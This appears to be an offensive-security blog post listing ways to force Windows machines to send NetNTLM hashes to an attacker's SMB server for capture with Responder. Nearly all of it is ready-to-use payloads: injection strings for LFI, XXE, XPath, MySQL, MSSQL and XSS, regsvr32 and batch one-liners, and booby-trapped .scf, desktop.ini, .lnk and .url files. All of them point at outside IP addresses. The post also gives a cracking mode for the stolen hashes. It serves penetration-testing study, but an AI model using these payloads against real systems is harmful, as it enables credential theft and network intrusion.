One day me and @m3g9tr0n were discussing different places where we can use responder in stealing NetNTLM hashes. After experimenting I thought of writing this post along with some cool findings in the world of Windows. SMBRelay attacks are also possible in these scenarios.

## Note !!!
```
to crack the ntlmv2 we can use -m 5600
```
The include() in PHP will resolve the network path for us.


###  LFI

The include() in PHP will resolve the network path for us.

```c
http://host.tld/?page=//11.22.33.44/@OsandaMalith
```

### XXE

In here I’m using “php://filter/convert.base64-encode/resource=” that will resolve a network path.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//11.22.33.44/@OsandaMalith" >
]>
<root>
  <name></name>
  <tel></tel>
  <email>OUT&xxe;OUT</email>
  <password></password>
</root>
```

### XPath Injection

Usually, doc() is used in out-of-band XPath injections, thus can be applied in resolving a network path.

```c
http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')
```

### MySQL Injection

I have written a complete post on MySQL out-of-band injections which can be applied over the internet. You can also use ‘INTO OUTFILE’ to resolve a network path.

```c
http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00
```

### MSSQL

Since stacked queries are supported we can call stored procedures.

```c
‘;declare @q varchar(99);set @q=’\\192.168.254.52\test’; exec master.dbo.xp_dirtree
```

### Regsvr32
Accidently found this one while experimenting with .sct files.


```c
regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
```

### Batch
There are many possible ways you can explore


```c
echo 1 > //192.168.0.1/abc
pushd \\192.168.0.1\abc
cmd /k \\192.168.0.1\abc
cmd /c \\192.168.0.1\abc
start \\192.168.0.1\abc
mkdir \\192.168.0.1\abc
type\\192.168.0.1\abc
dir\\192.168.0.1\abc
find, findstr, [x]copy, move, replace, del, rename and many more!
```


### Shell Command Files
You can save this as something.scf and once you open the folder explorer will try to resolve the network path for the icon.


```c
[Shell]
Command=2
IconFile=\\35.164.153.224\test.ico
[Taskbar]
Command=ToggleDesktop
```

### Desktop.ini
The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.

```c
mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\192.168.0.1\aa >> desktop.ini
attrib +s +h desktop.ini
```

In Windows XP systems the desktop.ini file uses ‘IcondFile’ instead of ‘IconResource’.

```c
[.ShellClassInfo]
IconFile=\\192.168.0.1\aa
IconIndex=1337
```



### Shortcut Files (.lnk)
We can create a shortcut containing our network path and as you as you open the shortcut Windows will try to resolve the network path. You can also specify a keyboard shortcut to trigger the shortcut. For the icon you can give the name of a Windows binary or choose an icon from either shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll or wmploc.dll located in the system32 directory.

```
Set shl = CreateObject(&quot;WScript.Shell&quot;)
Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
currentFolder = shl.CurrentDirectory

Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, &quot;\StealMyHashes.lnk&quot;))

sc.TargetPath = &quot;\\35.164.153.224\@OsandaMalith&quot;
sc.WindowStyle = 1
sc.HotKey = &quot;Ctrl+Alt+O&quot;
sc.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
sc.Description = &quot;I will Steal your Hashes&quot;
sc.Save
```

The Powershell version.
```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut(&quot;StealMyHashes.lnk&quot;)
$lnk.TargetPath = &quot;\\35.164.153.224\@OsandaMalith&quot;
$lnk.WindowStyle = 1
$lnk.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
$lnk.Description = &quot;I will Steal your Hashes&quot;
$lnk.HotKey = &quot;Ctrl+Alt+O&quot;
$lnk.Save()
[/code]
```

### Internet Shortcuts (.url)
Another shortcut in Windows is the Internet shortcuts. You can save this as something.url

```
echo [InternetShortcut] > stealMyHashes.url 
echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
```


### Autorun with Registry
You can add a new registry key in any of the following paths.

```c
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```



### Powershell
There are probably many scriptlets in Powershell that would resolve a network path.
```c
Invoke-Item \\192.168.0.1\aa
Get-Content \\192.168.0.1\aa
Start-Process \\192.168.0.1\aa
```

### IE
IE will resolve UNC paths. For example

```c
<img src="\\\\192.168.0.1\\aa"> 
```

You can inject under XSS or in scenarios you find SQL injection. For example.

```c
http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00 
```










